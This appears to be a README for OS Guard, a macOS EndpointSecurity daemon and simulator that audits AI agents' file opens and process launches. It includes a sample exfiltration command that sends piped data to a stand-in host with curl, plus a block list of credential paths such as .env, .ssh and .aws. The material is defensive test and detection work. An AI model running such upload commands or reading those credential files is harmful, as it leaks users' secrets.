# OS Guard Demo MVP

OS Guard adds a fourth event surface for file and process behavior that would normally sit below shell wrappers. Simulated OS events flow through the same policy, audit, state, cmux, and quarantine pipeline as prompt, command, and output events.

Native mode adds a Swift EndpointSecurity daemon that denies sensitive `AUTH_OPEN` file access locally and observes `NOTIFY_EXEC` process launches for audit. It does not deny `AUTH_EXEC` events.

## Commands

```bash
node src/cli.js os-guard status
node src/cli.js os-guard simulate-open .env --agent demo --pid 1234
node src/cli.js os-guard simulate-exec curl https://example.com/upload -d @- --agent demo --pid 1234
node src/cli.js os-guard register-existing --names codex,gemini
node src/cli.js agent --name demo --with-os-guard -- node -e 'console.log("done")'
node src/cli.js server
npm run demo:os-guard
```

## Event Shape

The adapter keeps structured metadata and also emits normalized text for the existing rule engine.

```text
os open path=.env pid=1234 agent=demo mode=simulate
os exec argv="curl https://example.com/upload -d @-" pid=1234 agent=demo mode=simulate
```

Reports keep metadata under `event.meta`, including `operation`, `path`, `argv`, `agent`, `pid`, and `mode`.

## Native AUTH_OPEN + NOTIFY_EXEC Mode

Start the Node policy server:

```bash
node src/cli.js server
```

Build, sign, and run the Swift daemon from `daemon/es-daemon` with the PID you want to watch:

```bash
DEVELOPER_DIR=/Applications/Xcode-16.2.0.app/Contents/Developer swift build
./scripts/sign.sh
sudo FOURGENT_WATCH_PIDS=1234 .build/debug/es-daemon
```

The daemon also opens a local control server on `127.0.0.1:7405` for runtime PID registration:

```text
POST http://127.0.0.1:7405/register-pid
GET  http://127.0.0.1:7405/status
```

When `404gent agent --with-os-guard -- ...` launches a child process, the CLI registers that child PID with the daemon automatically. To register already-running agents by process name:

```bash
node src/cli.js os-guard register-existing --names codex,claude,gemini,opencode
```

For smoke tests only, watch every PID:

```bash
sudo FOURGENT_WATCH_ALL=true .build/debug/es-daemon
```

`FOURGENT_WATCH_ALL=true` is test-only. The default is `false`; use `FOURGENT_WATCH_PIDS` for normal demo runs.

The daemon posts auth/audit OS events to `http://127.0.0.1:7404/os-event` by default. Override endpoints when needed:

```bash
sudo FOURGENT_POLICY_ENDPOINT=http://127.0.0.1:7404 FOURGENT_WATCH_PIDS=1234 .build/debug/es-daemon
FOURGENT_DAEMON_ENDPOINT=http://127.0.0.1:7405 node src/cli.js agent --name demo --with-os-guard -- node -e 'console.log("done")'
```

When the watched process opens `.env`, `.env.local`, `credentials.json`, `secrets.json`, or paths containing `/.ssh/`, `/.aws/`, or `/.gnupg/`, the daemon denies the open locally before best-effort Node reporting. `NOTIFY_EXEC` events such as `curl` launches are reported to 404gent for audit/state/cmux but are not blocked.

## Current Coverage

- Sensitive file open attempts block by default.
- Private key and certificate file open attempts block by default.
- Network transfer executable launches warn by default.
- Destructive executable launches block by default.
- Reverse-shell-like exec arguments block by default.

## Native Follow-Up

`src/integrations/os-guard.js` is the adapter boundary for native daemon events. Native `AUTH_OPEN` blocking is present for sensitive file opens; `AUTH_EXEC`, uninstall packaging, and production signing remain follow-up work.

The Swift daemon lives under `daemon/es-daemon/`. It creates an EndpointSecurity client when run on macOS with the required privileges and posts events to the local 404gent policy server.
